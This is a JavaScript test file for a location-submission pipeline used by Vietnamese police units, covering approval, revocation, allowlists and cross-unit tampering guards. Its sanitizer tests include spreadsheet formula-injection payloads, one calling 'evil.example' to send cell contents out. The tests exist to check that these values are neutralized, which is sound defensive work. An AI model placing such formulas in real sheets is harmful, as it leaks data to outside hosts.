const assert = require('node:assert/strict');
const test = require('node:test');

const pipeline = require('../setup/apps-script');

const NOW = new Date('2026-08-03T10:00:00.000Z');

function allowlist() {
    return [{
        unit_code: 'CA_TIEN_CAT', unit_name: 'Công an phường Tiên Cát',
        allowed_emails: 'tiencat@example.gov.vn; duty.tiencat@example.gov.vn', active: true,
    }];
}

function submission(overrides = {}) {
    return {
        requestId: 'REQ_TEST_01', requestType: pipeline.REQUEST_TYPES.create,
        submitterEmail: 'tiencat@example.gov.vn', submitterName: 'Nguyễn Văn A', submitterPhone: '0987000000',
        unitName: 'Công an phường Tiên Cát', locationName: 'Trụ sở Công an phường Tiên Cát',
        services: ['POLICE_OFFICE'], siteType: 'HEADQUARTERS', address: 'Khu 1, Phường Tiên Cát, Phú Thọ',
        publicPhone: '02103846114', mapsUrlOriginal: 'https://maps.google.com/?q=21.3225,105.4027',
        coordinates: '21.3225,105.4027', imageFileId: 'file-01', imageDriveUrl: 'https://drive.google.com/file/d/file-01/view',
        imagePublicUrl: 'https://drive.google.com/uc?export=view&id=file-01', imageMimeType: 'image/jpeg',
        cccdServiceMode: 'NOT_PROVIDED', searchAliases: 'Tiên Cát',
        ...overrides,
    };
}

function stage(input, publishedRecords = []) {
    return pipeline.buildStagingRecord(input, allowlist(), NOW, { publishedRecords });
}

test('one unit can have three approved physical locations without overwrite', () => {
    const stages = [
        stage(submission({ requestId: 'REQ_1', locationName: 'Trụ sở A' })),
        stage(submission({ requestId: 'REQ_2', locationName: 'Điểm CCCD B', services: ['CITIZEN_ID'], coordinates: '21.3235,105.4027' })),
        stage(submission({ requestId: 'REQ_3', locationName: 'Điểm làm việc C', coordinates: '21.3245,105.4027' })),
    ];
    let state = { stagingRecords: stages, publishedRecords: [], auditEntries: [] };
    for (const item of stages) state = pipeline.applyApproval(state, item.request_id, 'reviewer@example.gov.vn', '', NOW);
    assert.equal(state.publishedRecords.length, 3);
    assert.deepEqual(state.publishedRecords.map(record => record.record_id), stages.map(record => record.record_id));
});

test('a combined police and CCCD location remains one record with both services', () => {
    const record = stage(submission({ services: ['POLICE_OFFICE', 'CITIZEN_ID'] }));
    const approved = pipeline.applyApproval({ stagingRecords: [record], publishedRecords: [], auditEntries: [] }, record.request_id, 'reviewer@example.gov.vn', '', NOW);
    assert.equal(approved.publishedRecords.length, 1);
    assert.equal(approved.publishedRecords[0].type, 'police_station');
    assert.equal(approved.publishedRecords[0].services, 'POLICE_OFFICE|CITIZEN_ID');
});

test('update uses target record_id and does not overwrite another record in the same unit', () => {
    const first = stage(submission({ requestId: 'REQ_A', locationName: 'Trụ sở A' }));
    const second = stage(submission({ requestId: 'REQ_B', locationName: 'Điểm B', coordinates: '21.3235,105.4027' }));
    let state = { stagingRecords: [first, second], publishedRecords: [], auditEntries: [] };
    state = pipeline.applyApproval(state, first.request_id, 'reviewer@example.gov.vn', '', NOW);
    state = pipeline.applyApproval(state, second.request_id, 'reviewer@example.gov.vn', '', NOW);
    const update = stage(submission({
        requestId: 'REQ_UPDATE', requestType: pipeline.REQUEST_TYPES.update, targetRecordId: first.record_id,
        locationName: 'Trụ sở A đã cập nhật', address: 'Địa chỉ mới', imageFileId: 'file-new', imageMimeType: 'image/png',
    }), state.publishedRecords);
    state.stagingRecords.push(update);
    state = pipeline.applyApproval(state, update.request_id, 'reviewer@example.gov.vn', 'đã kiểm tra', NOW);
    assert.equal(state.publishedRecords.length, 2);
    assert.equal(state.publishedRecords.find(record => record.record_id === first.record_id).address, 'Địa chỉ mới');
    assert.equal(state.publishedRecords.find(record => record.record_id === second.record_id).name, 'Điểm B');
});

test('missing target record blocks update instead of converting it into a new location', () => {
    const record = stage(submission({
        requestType: pipeline.REQUEST_TYPES.update, targetRecordId: 'MISSING_RECORD', requestId: 'REQ_BAD_UPDATE',
    }), []);
    assert.equal(record.status, pipeline.STATUSES.blocked);
    assert.match(record.validation_errors, /TARGET_RECORD_ID_NOT_FOUND/);
    assert.throws(() => pipeline.applyApproval({ stagingRecords: [record], publishedRecords: [], auditEntries: [] }, record.request_id, 'reviewer@example.gov.vn'), /RECORD_INVALID/);
});

test('revoke removes only the selected record and returns its old image file id', () => {
    const first = stage(submission({ requestId: 'REQ_A', locationName: 'Trụ sở A', imageFileId: 'image-a' }));
    const second = stage(submission({ requestId: 'REQ_B', locationName: 'Điểm B', imageFileId: 'image-b', coordinates: '21.3235,105.4027' }));
    let state = { stagingRecords: [first, second], publishedRecords: [], auditEntries: [] };
    state = pipeline.applyApproval(state, first.request_id, 'reviewer@example.gov.vn', '', NOW);
    state = pipeline.applyApproval(state, second.request_id, 'reviewer@example.gov.vn', '', NOW);
    const revoked = pipeline.applyRevocation(state, first.record_id, 'reviewer@example.gov.vn', 'dừng điểm', NOW);
    assert.equal(revoked.publishedRecords.length, 1);
    assert.equal(revoked.publishedRecords[0].record_id, second.record_id);
    assert.equal(revoked.revokedImageFileId, 'image-a');
});

test('published record is an explicit public allowlist without internal fields', () => {
    const published = pipeline.buildPublishedRecord(stage(submission()), NOW);
    assert.deepEqual(Object.keys(published).sort(), [...pipeline.PUBLIC_FIELDS].sort());
    for (const field of ['submitter_email', 'submitter_phone', 'submitter_name', 'reviewed_by', 'validation_errors', 'review_note', 'auth_status']) {
        assert.equal(Object.hasOwn(published, field), false);
    }
});

test('allowlist blocks an email that is not assigned to the selected unit', () => {
    const record = stage(submission({ submitterEmail: 'outside@example.com' }));
    assert.equal(record.status, pipeline.STATUSES.blocked);
    assert.match(record.validation_errors, /EMAIL_NOT_AUTHORIZED_FOR_UNIT/);
});

test('validates exactly one allowed image MIME type', () => {
    assert.deepEqual(pipeline.validateImageSubmission([]), { ok: false, error: 'IMAGE_REQUIRED' });
    assert.deepEqual(pipeline.validateImageSubmission([{ mimeType: 'image/jpeg' }, { mimeType: 'image/png' }]), { ok: false, error: 'IMAGE_COUNT_MUST_BE_ONE' });
    assert.deepEqual(pipeline.validateImageSubmission([{ mimeType: 'application/pdf' }]), { ok: false, error: 'IMAGE_MIME_NOT_ALLOWED' });
    assert.deepEqual(pipeline.validateImageSubmission([{ mimeType: 'image/webp' }]), { ok: true });
});

test('blocks a submission without an explicitly selected service', () => {
    const record = stage(submission({ services: [] }));
    assert.equal(record.status, pipeline.STATUSES.blocked);
    assert.match(record.validation_errors, /SERVICES_MISSING/);
});

test('sanitizes spreadsheet formula injection for user-controlled values only', () => {
    assert.equal(pipeline.sanitizeSheetCell('=IMPORTXML("https://bad.example")'), "'=IMPORTXML(\"https://bad.example\")");
    const record = stage(submission({ locationName: '=malicious', address: '+formula', mapsUrlOriginal: '@link' }));
    assert.equal(record.location_name, "'=malicious");
    assert.equal(record.address, "'+formula");
    assert.equal(record.maps_url_original, "'@link");
    assert.equal(record.status, pipeline.STATUSES.blocked);
});

test('vô hiệu hoá công thức nhập qua target_record_id và record_id kế thừa từ nó', () => {
    // `target_record_id` là ô nhập tự do trong Form nên giá trị vẫn được ghi xuống Location_Staging
    // dù request bị block — cột đó phải được vô hiệu hoá công thức.
    const formula = '=IMPORTXML("https://evil.example/?d="&A1,"//a")';
    const created = stage(submission({ requestId: 'REQ_FORMULA_TARGET', targetRecordId: formula }));
    assert.equal(created.target_record_id, `'${formula}`);
    // Từ khi có bất biến CREATE, create không còn kế thừa target làm record_id nữa.
    assert.match(created.record_id, /^CA_TIEN_CAT_/);

    // Nhánh không-create vẫn lấy record_id từ target, nên đây mới là chỗ công thức lọt vào record_id.
    const updated = stage(submission({
        requestId: 'REQ_FORMULA_UPDATE', requestType: pipeline.REQUEST_TYPES.update, targetRecordId: formula,
    }));
    assert.equal(updated.record_id, `'${formula}`);
    assert.equal(updated.target_record_id, `'${formula}`);

    // Ca dương: record_id do pipeline sinh ra không bao giờ bị thêm dấu nháy oan.
    const normal = stage(submission({ requestId: 'REQ_PLAIN' }));
    assert.doesNotMatch(normal.record_id, /^'/);
});

test('classifies Maps coordinate conditions without losing the original URL', () => {
    assert.equal(pipeline.classifyCoordinateStatus({ mapsUrl: 'https://maps.google.com/?q=21.32,105.36' }).status, pipeline.COORDINATE_STATUSES.extracted);
    assert.equal(pipeline.classifyCoordinateStatus({ mapsUrl: 'https://maps.google.com/place/no-coordinate' }).status, pipeline.COORDINATE_STATUSES.needsReview);
    assert.equal(pipeline.classifyCoordinateStatus({ mapsUrl: 'https://example.com/?q=21.32,105.36' }).status, pipeline.COORDINATE_STATUSES.invalidLink);
    assert.equal(pipeline.classifyCoordinateStatus({ mapsUrl: 'https://maps.google.com/?q=10.77,106.7' }).status, pipeline.COORDINATE_STATUSES.outsidePhuTho);
    assert.equal(pipeline.classifyCoordinateStatus({ coordinates: '21.32,105.36', manuallyConfirmed: true }).status, pipeline.COORDINATE_STATUSES.manuallyConfirmed);
});

test('coordinate classification không phụ thuộc global URL (Apps Script V8 không có URL)', () => {
    // Regression: bản cũ dùng `new URL()`; trong runtime GAS không có URL global nên mọi link
    // Maps bị coi là INVALID_LINK. Mô phỏng GAS bằng cách gỡ globalThis.URL rồi kiểm.
    const savedURL = globalThis.URL;
    delete globalThis.URL;
    try {
        assert.equal(pipeline.isGoogleMapsUrl('https://maps.app.goo.gl/nRFwzQUUHzMNPcoo8'), true);
        assert.equal(pipeline.isGoogleMapsUrl('https://www.google.com/maps/place/x/@21.3171337,105.3950943,15z'), true);
        assert.equal(pipeline.isGoogleMapsUrl('https://evil.example.com/@21.32,105.40'), false);
        assert.equal(
            pipeline.classifyCoordinateStatus({ mapsUrl: 'https://www.google.com/maps/place/x/@21.3171337,105.3950943,15z' }).status,
            pipeline.COORDINATE_STATUSES.extracted,
        );
    } finally {
        globalThis.URL = savedURL;
    }
});

test('đơn vị active=false (boolean từ Sheets) bị loại khỏi allowlist và không authorize được', () => {
    // Regression: normalizeLabel cũ nuốt boolean false (`false || ''` = '') nên normalizeBoolean(false)
    // trả nhầm ACTIVE — đơn vị đã tắt vẫn hiện trong Form và vẫn qua authorizeSubmission.
    assert.equal(pipeline.normalizeBoolean(false), false);
    assert.equal(pipeline.normalizeBoolean(true), true);
    assert.equal(pipeline.normalizeBoolean('FALSE'), false);
    assert.equal(pipeline.normalizeBoolean('off'), false);
    assert.equal(pipeline.normalizeBoolean(''), true, 'để trống = đang hoạt động');
    const rows = [{ unit_code: 'CA_X', unit_name: 'Công an phường X', allowed_emails: 'x@example.gov.vn', active: false }];
    assert.equal(pipeline.buildAllowlistMap(rows).byUnitName.size, 0, 'đơn vị tắt không vào allowlist map');
    const auth = pipeline.authorizeSubmission('Công an phường X', 'x@example.gov.vn', rows);
    assert.equal(auth.authorized, false);
    assert.equal(auth.error, 'UNIT_NOT_IN_ALLOWLIST');
});

test('warns instead of merging an equally named point within 50 meters', () => {
    const old = { record_id: 'OLD_1', name: 'Điểm tiếp dân', coordinates: '21.3200,105.3600' };
    const warnings = pipeline.detectDuplicateWarnings({ recordId: 'NEW_1', requestType: pipeline.REQUEST_TYPES.create, locationName: 'Điểm tiếp dân', coordinates: '21.3202,105.3600' }, [old]);
    assert.deepEqual(warnings, ['POSSIBLE_DUPLICATE:OLD_1']);
});

test('legacy migration is dry-run pure and preserves separate records under one unit', () => {
    const source = [
        { unit_code: 'CA_A', name: 'A', type: 'police_station', coordinates: '21.32,105.36' },
        { unit_code: 'CA_A', name: 'B', type: 'id_center', coordinates: '21.33,105.36' },
    ];
    const before = JSON.parse(JSON.stringify(source));
    const result = pipeline.migrateLegacyLocations(source);
    assert.deepEqual(source, before);
    assert.equal(result.records.length, 2);
    assert.equal(result.records[0].services, 'POLICE_OFFICE');
    assert.equal(result.records[1].services, 'CITIZEN_ID');
    assert.equal(result.report.missingRecordId, 2);
});

// --- Cross-unit target records -------------------------------------------------------------
// `record_id` được trả ra trong payload công khai của `/api/google-sheet`, nên nó KHÔNG phải bí mật.
// Biết record_id của đơn vị khác không được biến thành quyền sửa/xoá bản ghi đó.

function twoUnitAllowlist() {
    return [
        { unit_code: 'CA_TIEN_CAT', unit_name: 'Công an phường Tiên Cát', allowed_emails: 'tiencat@example.gov.vn', active: true },
        { unit_code: 'CA_VAN_PHU', unit_name: 'Công an phường Vân Phú', allowed_emails: 'vanphu@example.gov.vn', active: true },
    ];
}

function stageTwoUnit(input, publishedRecords = []) {
    return pipeline.buildStagingRecord(input, twoUnitAllowlist(), NOW, { publishedRecords });
}

// Bản ghi đã publish hợp lệ của đơn vị B, dựng qua đúng pipeline thay vì viết tay.
function publishedVanPhuRecord() {
    const staged = stageTwoUnit(submission({
        requestId: 'REQ_VAN_PHU', unitName: 'Công an phường Vân Phú', submitterEmail: 'vanphu@example.gov.vn',
        locationName: 'Trụ sở Công an phường Vân Phú', address: 'Khu 5, Phường Vân Phú, Phú Thọ',
        coordinates: '21.3400,105.4100', mapsUrlOriginal: 'https://maps.google.com/?q=21.3400,105.4100',
        imageFileId: 'file-van-phu',
    }));
    const state = pipeline.applyApproval(
        { stagingRecords: [staged], publishedRecords: [], auditEntries: [] },
        staged.request_id, 'reviewer@example.gov.vn', '', NOW,
    );
    assert.equal(state.publishedRecords[0].unit_code, 'CA_VAN_PHU');
    return state.publishedRecords[0];
}

test('cán bộ đơn vị A không update được record đã publish của đơn vị B', () => {
    const victim = publishedVanPhuRecord();
    const snapshot = JSON.parse(JSON.stringify([victim]));
    const record = stageTwoUnit(submission({
        requestId: 'REQ_CROSS_UPDATE', requestType: pipeline.REQUEST_TYPES.update,
        targetRecordId: victim.record_id, locationName: 'Trụ sở bị chiếm', address: 'Địa chỉ giả mạo',
    }), [victim]);

    assert.equal(record.status, pipeline.STATUSES.blocked);
    assert.match(record.validation_errors, /TARGET_RECORD_UNIT_MISMATCH/);
    assert.throws(
        () => pipeline.applyApproval({ stagingRecords: [record], publishedRecords: [victim], auditEntries: [] }, record.request_id, 'reviewer@example.gov.vn', '', NOW),
        /RECORD_INVALID/,
    );
    assert.deepEqual([victim], snapshot, 'Published_Locations không được đổi');
});

// Case B: create + target của ĐƠN VỊ KHÁC. Dính cả hai rule; điều bắt buộc là không PENDING.
test('yêu cầu create mang sẵn target_record_id của đơn vị khác cũng bị chặn', () => {
    const victim = publishedVanPhuRecord();
    const record = stageTwoUnit(submission({
        requestId: 'REQ_CROSS_CREATE', requestType: pipeline.REQUEST_TYPES.create,
        targetRecordId: victim.record_id, locationName: 'Điểm mới nhưng cướp record_id',
    }), [victim]);

    assert.equal(record.status, pipeline.STATUSES.blocked);
    assert.match(record.validation_errors, /CREATE_TARGET_RECORD_ID_NOT_ALLOWED/);
    assert.match(record.validation_errors, /TARGET_RECORD_UNIT_MISMATCH/);
    assert.notEqual(record.record_id, victim.record_id, 'create không được kế thừa record_id của target');
});

test('yêu cầu stop cross-unit bị chặn ở cả staging lẫn khâu duyệt', () => {
    const victim = publishedVanPhuRecord();
    const record = stageTwoUnit(submission({
        requestId: 'REQ_CROSS_STOP', requestType: pipeline.REQUEST_TYPES.stop, targetRecordId: victim.record_id,
    }), [victim]);
    assert.equal(record.status, pipeline.STATUSES.blocked);
    assert.match(record.validation_errors, /TARGET_RECORD_UNIT_MISMATCH/);

    // Nhánh stop có code path riêng (splice khỏi Published_Locations). Giả lập người duyệt xoá tay ô
    // validation_errors trong Sheet để chứng minh chốt chặn thứ hai trong applyApproval còn hiệu lực.
    const tampered = { ...record, validation_errors: '' };
    const state = { stagingRecords: [tampered], publishedRecords: [victim], auditEntries: [] };
    assert.throws(
        () => pipeline.applyApproval(state, tampered.request_id, 'reviewer@example.gov.vn', '', NOW),
        /TARGET_RECORD_UNIT_MISMATCH/,
    );
    assert.equal(state.publishedRecords.length, 1, 'không bị xoá khỏi Published_Locations');
});

test('applyApproval chặn ghi đè cross-unit kể cả khi validation_errors bị xoá tay', () => {
    const victim = publishedVanPhuRecord();
    const record = stageTwoUnit(submission({
        requestId: 'REQ_TAMPERED', requestType: pipeline.REQUEST_TYPES.update,
        targetRecordId: victim.record_id, locationName: 'Trụ sở bị chiếm', address: 'Địa chỉ giả mạo',
    }), [victim]);
    const tampered = { ...record, validation_errors: '' };
    assert.throws(
        () => pipeline.applyApproval({ stagingRecords: [tampered], publishedRecords: [victim], auditEntries: [] }, tampered.request_id, 'reviewer@example.gov.vn', '', NOW),
        /TARGET_RECORD_UNIT_MISMATCH/,
    );
});

test('update đúng đơn vị mình vẫn chạy bình thường, không phát sinh TARGET_RECORD_UNIT_MISMATCH', () => {
    const created = stageTwoUnit(submission({ requestId: 'REQ_OWN', locationName: 'Trụ sở Tiên Cát' }));
    let state = pipeline.applyApproval(
        { stagingRecords: [created], publishedRecords: [], auditEntries: [] },
        created.request_id, 'reviewer@example.gov.vn', '', NOW,
    );
    const own = state.publishedRecords[0];

    const update = stageTwoUnit(submission({
        requestId: 'REQ_OWN_UPDATE', requestType: pipeline.REQUEST_TYPES.update,
        targetRecordId: own.record_id, locationName: 'Trụ sở Tiên Cát', address: 'Địa chỉ đã cập nhật',
    }), state.publishedRecords);

    assert.equal(update.validation_errors, '');
    assert.equal(update.status, pipeline.STATUSES.pending);
    state.stagingRecords.push(update);
    state = pipeline.applyApproval(state, update.request_id, 'reviewer@example.gov.vn', '', NOW);
    assert.equal(state.publishedRecords.length, 1);
    assert.equal(state.publishedRecords[0].address, 'Địa chỉ đã cập nhật');
});

test('so khớp chủ sở hữu bỏ qua hoa thường/khoảng trắng nhưng fail closed khi thiếu unit_code', () => {
    const created = stageTwoUnit(submission({ requestId: 'REQ_LEGACY', locationName: 'Trụ sở Tiên Cát' }));
    const state = pipeline.applyApproval(
        { stagingRecords: [created], publishedRecords: [], auditEntries: [] },
        created.request_id, 'reviewer@example.gov.vn', '', NOW,
    );
    const own = state.publishedRecords[0];

    // Bản ghi legacy nhập tay lệch hoa thường/khoảng trắng: vẫn là đơn vị đó, không được chặn oan.
    const skewed = { ...own, unit_code: '  ca_tien_cat ' };
    const okRecord = stageTwoUnit(submission({
        requestId: 'REQ_SKEW', requestType: pipeline.REQUEST_TYPES.update, targetRecordId: skewed.record_id,
        locationName: 'Trụ sở Tiên Cát', address: 'Địa chỉ mới',
    }), [skewed]);
    assert.doesNotMatch(okRecord.validation_errors, /TARGET_RECORD_UNIT_MISMATCH/);

    // Bản ghi published không có unit_code thì không chứng minh được chủ sở hữu => chặn.
    const orphan = { ...own, unit_code: '' };
    const blocked = stageTwoUnit(submission({
        requestId: 'REQ_ORPHAN', requestType: pipeline.REQUEST_TYPES.update, targetRecordId: orphan.record_id,
        locationName: 'Trụ sở Tiên Cát', address: 'Địa chỉ mới',
    }), [orphan]);
    assert.equal(blocked.status, pipeline.STATUSES.blocked);
    assert.match(blocked.validation_errors, /TARGET_RECORD_UNIT_MISMATCH/);
});

// --- Bất biến CREATE ------------------------------------------------------------------------
// "Thêm địa điểm mới" phải luôn tạo bản ghi mới. Một CREATE mang target_record_id là mâu thuẫn
// ngữ nghĩa và trước đây đi lọt tới PENDING rồi ghi đè bản ghi đang publish khi được duyệt.

// Case A: create + target CÙNG đơn vị — ca mà guard cross-unit không bắt được.
test('create mang target_record_id của chính đơn vị mình bị chặn, không ghi đè bản ghi đang publish', () => {
    const created = stageTwoUnit(submission({ requestId: 'REQ_OWN_1', locationName: 'Trụ sở Tiên Cát' }));
    const state = pipeline.applyApproval(
        { stagingRecords: [created], publishedRecords: [], auditEntries: [] },
        created.request_id, 'reviewer@example.gov.vn', '', NOW,
    );
    const existing = state.publishedRecords[0];
    const snapshot = JSON.parse(JSON.stringify(state.publishedRecords));

    const record = stageTwoUnit(submission({
        requestId: 'REQ_CREATE_TARGET', requestType: pipeline.REQUEST_TYPES.create,
        targetRecordId: existing.record_id, locationName: 'Điểm CCCD mới',
    }), state.publishedRecords);

    assert.equal(record.status, pipeline.STATUSES.blocked);
    assert.match(record.validation_errors, /CREATE_TARGET_RECORD_ID_NOT_ALLOWED/);
    assert.doesNotMatch(record.validation_errors, /TARGET_RECORD_UNIT_MISMATCH/, 'cùng đơn vị nên guard cross-unit không kích hoạt');
    assert.notEqual(record.record_id, existing.record_id);

    // Duyệt thử: bị chặn ở RECORD_INVALID và Published_Locations không đổi.
    assert.throws(
        () => pipeline.applyApproval({ stagingRecords: [record], publishedRecords: state.publishedRecords, auditEntries: [] }, record.request_id, 'reviewer@example.gov.vn', '', NOW),
        /RECORD_INVALID/,
    );
    assert.deepEqual(state.publishedRecords, snapshot, 'Published_Locations không được đổi');

    // Chốt chặn thứ hai: kể cả khi người duyệt xoá tay ô validation_errors trong Sheet.
    const tampered = { ...record, validation_errors: '' };
    assert.throws(
        () => pipeline.applyApproval({ stagingRecords: [tampered], publishedRecords: state.publishedRecords, auditEntries: [] }, tampered.request_id, 'reviewer@example.gov.vn', '', NOW),
        /CREATE_TARGET_RECORD_ID_NOT_ALLOWED/,
    );
    assert.deepEqual(state.publishedRecords, snapshot, 'Published_Locations vẫn không đổi sau khi tamper');
});

// Case C: CREATE bình thường.
test('create không có target_record_id vào PENDING với record_id do pipeline sinh', () => {
    const record = stageTwoUnit(submission({ requestId: 'REQ_PLAIN_CREATE', locationName: 'Trụ sở Tiên Cát' }));
    assert.equal(record.status, pipeline.STATUSES.pending);
    assert.equal(record.validation_errors, '');
    assert.equal(record.target_record_id, '');
    assert.match(record.record_id, /^CA_TIEN_CAT_/, 'id do buildRecordId sinh từ unit_code đã authorize');
});

// Case D: hai CREATE cùng đơn vị.
test('hai create cùng đơn vị sinh hai record_id khác nhau và không đè nhau', () => {
    const a = stageTwoUnit(submission({ requestId: 'REQ_A2', locationName: 'Trụ sở A' }));
    const b = stageTwoUnit(submission({ requestId: 'REQ_B2', locationName: 'Điểm CCCD B', services: ['CITIZEN_ID'], coordinates: '21.3235,105.4027' }));
    assert.notEqual(a.record_id, b.record_id);

    let state = { stagingRecords: [a, b], publishedRecords: [], auditEntries: [] };
    state = pipeline.applyApproval(state, a.request_id, 'reviewer@example.gov.vn', '', NOW);
    state = pipeline.applyApproval(state, b.request_id, 'reviewer@example.gov.vn', '', NOW);
    assert.equal(state.publishedRecords.length, 2);
    assert.deepEqual(state.publishedRecords.map(r => r.unit_code), ['CA_TIEN_CAT', 'CA_TIEN_CAT']);
});

// Case E: bất biến CREATE không được làm hỏng UPDATE.
test('update đúng record cùng đơn vị không bị bất biến CREATE chặn nhầm', () => {
    const created = stageTwoUnit(submission({ requestId: 'REQ_E1', locationName: 'Trụ sở Tiên Cát' }));
    let state = pipeline.applyApproval(
        { stagingRecords: [created], publishedRecords: [], auditEntries: [] },
        created.request_id, 'reviewer@example.gov.vn', '', NOW,
    );
    const own = state.publishedRecords[0];

    const update = stageTwoUnit(submission({
        requestId: 'REQ_E2', requestType: pipeline.REQUEST_TYPES.update, targetRecordId: own.record_id,
        locationName: 'Trụ sở Tiên Cát', address: 'Địa chỉ đã cập nhật',
    }), state.publishedRecords);
    assert.equal(update.validation_errors, '');
    assert.equal(update.record_id, own.record_id, 'update vẫn giữ record_id của bản ghi đích');

    state.stagingRecords.push(update);
    state = pipeline.applyApproval(state, update.request_id, 'reviewer@example.gov.vn', '', NOW);
    assert.equal(state.publishedRecords.length, 1);
    assert.equal(state.publishedRecords[0].address, 'Địa chỉ đã cập nhật');
});

// ---------------------------------------------------------------------------
// resolveUnitsByEmail — prerequisite Staff Portal (Gate 4.5).
// Ca B08–B13 trong docs/location-intake/STAFF_PORTAL_TEST_MATRIX.md.
// ---------------------------------------------------------------------------

function multiUnitAllowlist() {
    return [
        { unit_code: 'CA_A', unit_name: 'Công an phường A', allowed_emails: 'canbo@example.gov.vn', active: true },
        { unit_code: 'CA_B', unit_name: 'Công an phường B', allowed_emails: 'canbo@example.gov.vn; khac@example.gov.vn', active: true },
        { unit_code: 'CA_C', unit_name: 'Công an phường C', allowed_emails: 'canbo@example.gov.vn', active: false },
        { unit_code: 'CA_D', unit_name: 'Công an phường D', allowed_emails: '', active: true },
    ];
}

test('B08 email lạ không nhận được đơn vị nào', () => {
    assert.deepEqual(pipeline.resolveUnitsByEmail('nguoila@example.gov.vn', multiUnitAllowlist()), []);
});

test('B09 đơn vị inactive bị bỏ qua dù email có trong dòng đó', () => {
    const units = pipeline.resolveUnitsByEmail('canbo@example.gov.vn', multiUnitAllowlist());
    assert.equal(units.some(unit => unit.unitCode === 'CA_C'), false, 'CA_C đã tắt');
});

test('B09b đơn vị active nhưng chưa cấu hình email không lọt ra', () => {
    const units = pipeline.resolveUnitsByEmail('', multiUnitAllowlist());
    assert.deepEqual(units, [], 'email rỗng fail closed, không khớp dòng allowed_emails rỗng');
    const other = pipeline.resolveUnitsByEmail('khac@example.gov.vn', multiUnitAllowlist());
    assert.deepEqual(other.map(unit => unit.unitCode), ['CA_B'], 'CA_D thiếu email không bao giờ được trả');
});

test('B10 email thuộc đúng một đơn vị active trả đúng một đơn vị', () => {
    const units = pipeline.resolveUnitsByEmail('khac@example.gov.vn', multiUnitAllowlist());
    assert.deepEqual(units, [{ unitCode: 'CA_B', unitName: 'Công an phường B' }]);
});

test('B11 một email thuộc nhiều đơn vị active trả đủ các đơn vị đó', () => {
    const units = pipeline.resolveUnitsByEmail('canbo@example.gov.vn', multiUnitAllowlist());
    assert.deepEqual(units.map(unit => unit.unitCode).sort(), ['CA_A', 'CA_B']);
});

test('B12 dòng allowlist trùng lặp chỉ sinh một đơn vị', () => {
    const rows = [
        { unit_code: 'CA_A', unit_name: 'Công an phường A', allowed_emails: 'canbo@example.gov.vn', active: true },
        { unit_code: 'CA_A', unit_name: 'Công an phường A', allowed_emails: 'canbo@example.gov.vn', active: true },
        { unit_code: 'ca_a', unit_name: 'Công an  phường A ', allowed_emails: 'canbo@example.gov.vn', active: true },
    ];
    const units = pipeline.resolveUnitsByEmail('canbo@example.gov.vn', rows);
    assert.equal(units.length, 1, 'ba dòng cùng một đơn vị chỉ sinh một entry');
    // unit_code lấy theo dòng cuối cùng, giống hệt buildAllowlistMap/authorizeSubmission — quan trọng
    // là hai chiều không lệch nhau, chứ không phải dòng nào thắng.
    assert.equal(units[0].unitCode, pipeline.authorizeSubmission(units[0].unitName, 'canbo@example.gov.vn', rows).unitCode);
});

test('B13 email được chuẩn hóa hoa thường và khoảng trắng trước khi tra cứu', () => {
    const units = pipeline.resolveUnitsByEmail('  CanBo@Example.GOV.VN  ', multiUnitAllowlist());
    assert.deepEqual(units.map(unit => unit.unitCode).sort(), ['CA_A', 'CA_B']);
});

test('resolveUnitsByEmail không rò allowed_emails hay notes ra ngoài', () => {
    const rows = [{
        unit_code: 'CA_A', unit_name: 'Công an phường A', allowed_emails: 'canbo@example.gov.vn; sep@example.gov.vn',
        active: true, notes: 'ghi chú nội bộ',
    }];
    assert.deepEqual(pipeline.resolveUnitsByEmail('canbo@example.gov.vn', rows), [
        { unitCode: 'CA_A', unitName: 'Công an phường A' },
    ]);
});

test('resolveUnitsByEmail khớp đúng tập đơn vị mà authorizeSubmission chấp nhận', () => {
    const rows = multiUnitAllowlist();
    for (const unit of pipeline.resolveUnitsByEmail('canbo@example.gov.vn', rows)) {
        assert.equal(pipeline.authorizeSubmission(unit.unitName, 'canbo@example.gov.vn', rows).authorized, true,
            `${unit.unitCode} phải qua được authorizeSubmission`);
    }
    for (const unitName of ['Công an phường C', 'Công an phường D']) {
        assert.equal(pipeline.authorizeSubmission(unitName, 'canbo@example.gov.vn', rows).authorized, false,
            `${unitName} không được resolve nên cũng phải bị authorizeSubmission từ chối`);
    }
});
